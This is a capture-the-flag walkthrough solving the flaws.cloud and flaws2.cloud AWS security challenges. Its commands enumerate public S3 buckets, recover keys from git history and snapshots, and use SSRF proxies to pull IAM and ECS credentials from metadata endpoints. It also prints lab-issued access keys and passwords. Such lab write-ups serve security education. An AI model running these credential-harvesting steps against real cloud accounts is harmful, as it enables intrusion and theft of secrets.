# AWS CLOUD - Pentest

### Below is the solution for both FLAWS and FLAWS2 Challenges

## Flaws challenges [http://flaws.cloud](http://flaws.cloud)

#### Background

[flaws.cloud](http://flaws.cloud/) itself says it best:

    Through a series of levels you'll learn about common mistakes and gotchas when using Amazon Web Services (AWS). 
    There are no SQL injection, XSS, buffer overflows, or many of the other vulnerabilities you might have seen before. As much as possible, these are AWS specific issues.
    
    A series of hints are provided that will teach you how to discover the info you'll need. 
    If you don't want to actually run any commands, you can just keep following the hints which will give you the solution to the next level. 
    At the start of each level you'll learn how to avoid the problem the previous level exhibited.

  Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud. 


### Levels

**| 1.  Misconfigure public bucket**

`aws s3 ls  s3://flaws.cloud/ —no-sign-request —region us-west-2`

**| 2. Misconfigure public bucket with ACL of was user**

`aws s3 —profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`

**| 3. Misconfigure public bucket with git**

```
aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud —no-sign-request —region us-west-1 flaws —recursive
cd flaws
Git log
Git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
cat access_keys.txt
aws configure —profile flaws
aws s3 ls --profile flaws
```

![](CLOUD/Screenshot%202019-10-20%20at%206.29.58%20PM.png)


**| 4. Misconfigure public snapshot** - Grab credentials from volume and login to web server

```
aws —profile flaws sts get-caller-identity

aws ec2 describe-instances --profile flaws --region us-west-2 | grep PublicDns

aws ec2 describe-instances --profile flaws --region us-west-2 | grep VolumeId
```
	
![](CLOUD/Screenshot%202019-10-20%20at%206.13.24%20PM.png)

So the IAM user account Is backup 
Public dns name matches for target web server and running instance

List the snapshots belong to that account in specific region

```
aws —profile flaws  ec2 describe-snapshots --owner-id 975426262029 --region us-west-2

aws ec2 describe-snapshots --filters "Name=volume-id, Values=vol-04f1c039bc13ea950" --profile flaws --region us-west-2
```

![](CLOUD/Screenshot%202019-10-20%20at%205.15.41%20PM.png)

Create a volume with snapshot and mount it to an EC2
Login to instance

```
lsblk
sudo file -s /dev/xvdf1
sudo mount /dev/xvdf1 /mnt
cd /mnt/home/ubuntu/
cat setupNginx.sh
```

![](CLOUD/Screenshot%202019-10-20%20at%206.38.40%20PM.png)

```
Credentials
Username - flaws
Password - nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```


**| 5. Leakage of Security credentials**

The web server acts as HTTP proxy [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/) 

`curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws`

![](CLOUD/Screenshot%202019-10-20%20at%207.35.16%20PM.png)

Configure a profile with the credentials and token,

![](CLOUD/Screenshot%202019-10-20%20at%207.53.22%20PM.png)

List the contents of level6 bucket,

`aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile level5`

![](CLOUD/Screenshot%202019-10-20%20at%207.57.25%20PM.png)

Visit the sub directory for level 6

`http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`


**| 6. Enumeration after AWS user keys**

Given credentials

```
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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
```

Configure it in a profile and check for user info and attached policies

`aws --profile level6 iam get-user`

`aws --profile level6 iam list-attached-user-policies --user-name Level6`

![](CLOUD/Screenshot%202019-10-20%20at%208.27.16%20PM.png)


After knowing the attached policy, can for version and what the actual policy is,

```
aws --profile level6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways

aws --profile level6 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
```

![](CLOUD/Screenshot%202019-10-20%20at%208.37.32%20PM.png)

Now its clear that, we can call an API Gateway using GET method
Usually API Gateways are used in conjunction with lambda function, so check for any lambda running in account

`aws --region us-west-2 --profile level6 lambda list-functions`

there is a lambda function named “Level6”, 
Look into lambda policy,

`aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6`

![](CLOUD/Screenshot%202019-10-20%20at%209.17.24%20PM.png)


We can execute `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\` That "s33ppypa75" is a rest-api-id

Then find stage name,
`aws —profile level6 —region us-west-2 apigateway get-stages —rest-api-id "s33ppypa75"`

![](CLOUD/Screenshot%202019-10-20%20at%209.38.11%20PM.png)

the stage name is “Prod”. 
Lambda functions are called using that rest-api-id, region, stage name and resource (function name)

So the url is,
https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6

![](CLOUD/Screenshot%202019-10-20%20at%209.41.01%20PM.png)
 



## Flaws2  challenges [http://flaws2.cloud](http://flaws2.cloud)

#### Background:

[flaws2.cloud](http://flaws2.cloud/) itself says it best:

    Welcome to the flAWS 2 challenge! Similar to the original flAWS.cloud, this game/tutorial teaches you AWS security concepts.
    
    The challenges are focused on AWS specific issues, so no buffer overflows, XSS, etc.
	You can play by getting hands-on-keyboard or just click through the hints to learn the concepts and go from one level to the next without playing. 
    flAWS 2 has two paths this time: Attacker and Defender! In the Attacker path, you'll exploit your way through misconfigurations in serverless (Lambda) and containers (ECS Fargate). In the Defender path, that target is now viewed as the victim and you'll work as an incident responder for that same app, understanding how an attack happened. You'll get access to logs of a previous successful attack. As a Defender you'll learn the power of jq in analyzing logs, and instructions on how to set up Athena in your own environment


### Attacker

### Levels

**| 1. Misconfigured S3 endpoint**

![](CLOUD/Screenshot%202019-11-02%20at%205.56.30%20PM.png)

Note the request url and paste it in browser and change code value to see any error


![](CLOUD/Screenshot%202019-11-02%20at%205.58.07%20PM.png)

Configure aws cli profile with the keys and session token


![](CLOUD/Screenshot%202019-11-02%20at%206.03.01%20PM.png)


```
aws s3 ls s3://level1.flaws2.cloud --profile level1.flaws2
```
 
![](CLOUD/Screenshot%202019-11-02%20at%206.28.31%20PM.png)


Check that file in browser

`http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html`

It will give access to next challenge 

`http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud`



**| 2. Misconfigured ECR [ Elastic Container registry ]**

`http://container.target.flaws2.cloud/`

As we know it is a container challenge, lets list the publicly available containers of that AWS Account

Get account id and use all region to find out any available containers

```
aws sts get-caller-identity --profile level1.flaws2
aws ecr list-images --repository-name level2 --registry-id 653711331788  --region us-east-1 --profile level1.flaws2
```

Or

```
aws sts get-caller-identity --profile level1.flaws2
while read LINE; do aws ecr list-images --repository-name level2 --registry-id 653711331788 --profile level1.flaws2 --region "$LINE" ; done < /Users/gopikrishna/Desktop/regions.txt
```


![](CLOUD/Screenshot%202019-11-07%20at%2012.07.49%20AM.png)


Pull the container using docker and inspect
First login to aws ecr,

`
aws ecr get-login --region us-east-1 --profile level1.flaws2
`

![](CLOUD/Screenshot%202019-11-07%20at%2012.19.23%20AM.png)

Use docker login command to login and download the container

`
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
`

![](CLOUD/Screenshot%202019-11-07%20at%2012.21.38%20AM.png)

We can see few cmds and lot of layers are in the image during inspect,
We have to view the old cmds executed 

```
docker images
docker image inspect 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
docker history 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2
docker history 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2 --no-trunc | grep "/bin/sh -c htpasswd -b -c"
```


![](CLOUD/Screenshot%202019-11-07%20at%202.00.57%20AM.png)


Or

Export docker image to vm and inspect layers using dive

```
docker save 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest > img.tar
docker load -i img.tar
```

![](CLOUD/Screenshot%202019-11-07%20at%202.48.12%20AM.png)


```
Dive 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2 
```


![](CLOUD/Screenshot%202019-11-07%20at%202.54.40%20AM.png)

Use the username flaws2 and password secret_password.

It will give access to next challenge 

 `http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud`


**| 3. SSRF in ECS**

Given a container application with ssrf vulnerability 

Container metadata credentials can be found in http://169.254.170.2/v2/credentials/GUID
where the GUID is found from an environment variable AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

In linux env variables can be found by looking in /proc/self/environ.

![](CLOUD/Screenshot%202019-11-09%20at%205.46.16%20PM.png)

Use the GUID to find was secret and access key 

```
curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6 | jq
```

![](CLOUD/Screenshot%202019-11-09%20at%205.51.21%20PM.png)


Configure the AWS access, secret and token in a profile
List the S3 buckets in that profile


![](CLOUD/Screenshot%202019-11-09%20at%205.59.01%20PM.png)


It's the END 

`the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud`




















